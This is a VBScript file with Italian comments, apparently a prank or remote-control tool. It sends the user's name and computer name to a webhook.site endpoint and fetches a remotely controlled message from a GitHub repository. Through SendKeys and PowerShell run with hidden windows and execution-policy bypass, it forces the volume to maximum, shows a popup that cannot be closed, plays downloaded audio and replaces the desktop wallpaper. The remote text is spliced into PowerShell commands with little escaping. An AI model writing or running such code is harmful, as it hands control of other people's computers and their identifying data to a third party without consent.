Option Explicit 
On Error Resume Next 

' --- CONFIGURAZIONE --- 
Dim shell, fso, xmlHttp, i, exec 
Dim urlImmagine1, urlImmagine2, urlImmagine3, urlAudio1, urlAudio2, urlAudio3 
Dim urlMessaggio, webhookURL 
Dim messaggioDalWeb, nomeUtente, nomePC 
Dim scelta1, scelta2, scelta3, sceltaEffettuata 
' Variabili temporanee per la sanificazione
Dim msgSafe, s1Safe, s2Safe, s3Safe

scelta1 = "Non vedo l'ora!" 
scelta2 = "" 
scelta3 = "" 

Dim ts: ts = Timer()
urlImmagine1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine1.jpg?v=" & ts
urlImmagine2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine2.jpg?v=" & ts
urlImmagine3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine3.jpg?v=" & ts
urlAudio1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio1.mp3" 
urlAudio2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio2.mp3" 
urlAudio3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio3.mp3" 
urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt" 
webhookURL = "https://webhook.site/548ae85b-8bc6-42de-a64c-4ffabb6a44d2" 

Set shell = CreateObject("WScript.Shell") 
Set fso = CreateObject("Scripting.FileSystemObject") 

nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%") 
nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%") 

' --- NOTIFICA AVVIO ---
InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, "AVVIO", "In attesa"

' --- DOWNLOAD MESSAGGIO --- 
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0") 
xmlHttp.Open "GET", urlMessaggio, False 
xmlHttp.Send 
If xmlHttp.Status = 200 Then 
    messaggioDalWeb = Trim(xmlHttp.responseText)
    ' NOTA: Qui NON facciamo il Replace, lo facciamo solo prima del popup
End If 

' --- VOLUME --- 
shell.SendKeys Chr(&hAD)  
For i = 1 To 50: shell.SendKeys Chr(&hAF): Next 

' --- PREPARAZIONE POPUP (Sanificazione) ---
' Creiamo variabili "Safe" solo per PowerShell, lasciando le originali intatte per il confronto finale
msgSafe = Replace(messaggioDalWeb, "'", "''")
s1Safe = Replace(scelta1, "'", "''")
s2Safe = Replace(scelta2, "'", "''")
s3Safe = Replace(scelta3, "'", "''")

' --- POPUP (Versione Robusta) --- 
If messaggioDalWeb <> "" Then 
    Dim psPopup 
    psPopup = "Add-Type -AssemblyName System.Windows.Forms; " & _ 
               "$f = New-Object Windows.Forms.Form; $f.Text = 'GEA'; $f.Size = '420,220'; " & _ 
               "$f.StartPosition = 'CenterScreen'; $f.FormBorderStyle = 'FixedDialog'; $f.ControlBox = $false; $f.TopMost = $true; " & _ 
               "$l = New-Object Windows.Forms.Label; $l.Text = '" & msgSafe & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
               "$l.Dock = 'Fill'; $l.Font = New-Object Drawing.Font('Segoe UI', 12); $f.Controls.Add($l); " & _ 
               "$p = New-Object Windows.Forms.FlowLayoutPanel; $p.Dock = 'Bottom'; $p.Height = 60; " & _ 
               "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; "
       
    ' Nota: Qui uso s1Safe per il testo del bottone, ma passo s1Safe anche al risultato
    ' PowerShell convertirà automaticamente i doppi apici in singoli quando li restituisce.
    If scelta1 <> "" Then psPopup = psPopup & "$b1 = New-Object Windows.Forms.Button; $b1.Text = '" & s1Safe & "'; $b1.AutoSize = $true; $b1.Add_Click({$global:res='" & s1Safe & "';$f.Close()}); $p.Controls.Add($b1); " 
    If scelta2 <> "" Then psPopup = psPopup & "$b2 = New-Object Windows.Forms.Button; $b2.Text = '" & s2Safe & "'; $b2.AutoSize = $true; $b2.Add_Click({$global:res='" & s2Safe & "';$f.Close()}); $p.Controls.Add($b2); " 
    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & s3Safe & "'; $b3.AutoSize = $true; $b3.Add_Click({$global:res='" & s3Safe & "';$f.Close()}); $p.Controls.Add($b3); " 
       
    psPopup = psPopup & "$f.Add_Shown({ " & _ 
               "$totalWidth = 0; foreach($ctrl in $p.Controls) { $totalWidth += $ctrl.Width + $ctrl.Margin.Left + $ctrl.Margin.Right }; " & _ 
               "$leftPadding = ($p.Width - $totalWidth) / 2; if($leftPadding -gt 0) { $p.Padding = New-Object Windows.Forms.Padding($leftPadding, 10, 0, 0) } " & _ 
               "}); " 
    psPopup = psPopup & "$f.Controls.Add($p); $f.ShowDialog() | Out-Null; Write-Output $global:res" 
       
    ' Uso di Chr(34) per gestire correttamente le virgolette esterne
    ' Rimosso -WindowStyle Hidden che spesso nasconde anche il form
    Set exec = shell.Exec("powershell -NoProfile -Command " & Chr(34) & psPopup & Chr(34)) 
    sceltaEffettuata = Replace(Replace(Replace(exec.StdOut.ReadAll(), vbCrLf, ""), vbCr, ""), vbLf, "") 
End If 

' --- LOGICA --- 
' Qui usiamo le variabili ORIGINALI (senza doppi apici) perché PowerShell ci restituisce il testo pulito
Select Case sceltaEffettuata 
    Case scelta1: RiproduciAudio urlAudio1: CambiaFondoDesktop urlImmagine1
    Case scelta2: RiproduciAudio urlAudio2: CambiaFondoDesktop urlImmagine2
    Case scelta3: RiproduciAudio urlAudio3: CambiaFondoDesktop urlImmagine3 
End Select 

' --- NOTIFICA FINALE --- 
InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, messaggioDalWeb, sceltaEffettuata 

' --- FUNZIONI --- (Invariate)
Sub RiproduciAudio(urlAudio) 
    Dim p: p = shell.ExpandEnvironmentStrings("%TEMP%") & "\a.mp3" 
    shell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 

    If fso.FileExists(p) Then 
        Dim psCmd
        psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName PresentationCore; " & _
                "$m = New-Object System.Windows.Media.MediaPlayer; " & _
                "$m.Open('" & p & "'); $m.Play(); Start-Sleep -Seconds 300""" 
        shell.Run psCmd, 0, False 
    End If 
End Sub

Sub CambiaFondoDesktop(urlImmagine) 
    Dim imgPath: imgPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\bg_current.jpg" 
    shell.Run "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & urlImmagine & "', '" & imgPath & "')""", 0, True 
    WScript.Sleep 2000 
    If fso.FileExists(imgPath) Then 
        Dim ps: ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "" " & _
                     "$p = '" & imgPath & "'; " & _
                     "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $p; " & _
                     "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\""user32.dll\"", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int b, string c, int d); }'; " & _
                     "[W]::SystemParametersInfo(20, 0, $p, 3);"""
        shell.Run ps, 0, True 
    End If 
End Sub 

Sub InviaNotificaRemoteWebhook(url, utente, pc, messaggio, scelta) 
    Dim body: body = "@{ 'utente' = '" & utente & "'; 'pc' = '" & pc & "'; 'scelta' = '" & scelta & "'; 'testo' = '" & messaggio & "' } | ConvertTo-Json"
    Dim cmd: cmd = "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
                   "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body (" & body & ") -ContentType 'application/json'"""
    shell.Run cmd, 0, True 
End Sub
